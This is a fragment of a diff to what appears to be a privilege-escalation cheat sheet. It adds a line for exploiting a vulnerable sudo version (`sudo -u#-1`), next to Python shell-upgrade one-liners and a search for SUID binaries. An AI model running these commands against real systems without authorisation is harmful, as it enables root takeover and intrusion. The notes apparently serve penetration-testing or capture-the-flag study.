@@ -10,6 +10,10 @@
 * python -c 'import pty;pty.spawn("/bin/bash")'
 * python3 -c 'import pty;pty.spawn("/bin/bash")'
 
+### Vulnerable sudo version
+`sudo -u#-1 whoami`
+
+
 ### Finding Binaries
 
 * find . - perm /4000 (user id uid) 
